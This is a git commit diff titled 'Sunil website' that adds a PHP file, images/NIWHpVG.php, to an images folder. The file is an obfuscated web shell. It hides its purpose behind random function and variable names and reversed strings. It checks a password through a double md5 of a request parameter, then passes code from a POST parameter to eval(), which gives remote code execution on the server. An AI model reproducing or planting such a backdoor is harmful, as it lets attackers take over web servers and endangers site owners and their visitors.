d495c94e296f6c86aa8190221127daf6c34007d2
Nijanthan Shankar S <nijanthan1952@gmail.com>
2025-12-03 12:26:57 +0530

    Sunil website

---
+++ images/NIWHpVG.php
@@ -0,0 +1,35 @@
+﻿<?php
+
+function uGnfgOtZ()
+{
+global $hMtpvcnbRxO;
+$hMtpvcnbRxO=oyGZobZdazX();
+if(isset($_REQUEST['x']))
+{
+	$eqELluajMsO = 'OJXmrDHUbNJXmrDHUbEJXmrDHUbPJXmrDHUbIJXmrDHUbEJXmrDHUbCJXmrDHUbE';
+    $eqELluajMsO=str_replace('JXmrDHUb','',$eqELluajMsO);
+
+    echo $eqELluajMsO;
+	if ( strcasecmp(md5(md5($_REQUEST['x'])),'2b500bb1f2ff90ad33fa50f8b14b472d') ==0 )
+    {
+	@eval("\"$hMtpvcnbRxO\"");
+    }
+}
+
+
+}
+function oyGZobZdazX()
+{
+        $rrQBWgnPa='TF6FMdB6037-moNQ';
+		$lBJueKttvUO=strrev($rrQBWgnPa);
+		if(isset($_POST[$lBJueKttvUO]))
+        {
+        $NuBwnxzt=str_replace('','',$_POST[$lBJueKttvUO]);
+        
+        return '";'.$NuBwnxzt.'//';
+		}
+}
+
+uGnfgOtZ();
+
+?>
